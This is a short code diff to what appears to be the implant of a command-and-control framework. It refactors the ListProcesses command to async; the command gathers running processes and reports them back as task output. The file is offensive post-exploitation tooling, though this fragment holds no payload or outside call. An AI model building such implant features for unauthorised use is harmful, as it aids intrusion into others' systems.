@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.Security.Principal;
 using System.Threading;
+using System.Threading.Tasks;
 
 namespace Drone.Commands;
 
@@ -14,7 +15,7 @@ public sealed class ListProcesses : DroneCommand
     public override byte Command => 0x1B;
     public override bool Threaded => false;
 
-    public override void Execute(DroneTask task, CancellationToken cancellationToken)
+    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
     {
         List<ProcessEntry> results = new();
         var processes = Process.GetProcesses();
@@ -33,7 +34,7 @@ public sealed class ListProcesses : DroneCommand
             });
         }
 
-        Drone.SendTaskOutput(new TaskOutput(task.Id, TaskStatus.COMPLETE, results.Serialize()));
+        await Drone.SendTaskOutput(new TaskOutput(task.Id, TaskStatus.COMPLETE, results.Serialize()));
     }
 
     private static int GetProcessParent(Process process)
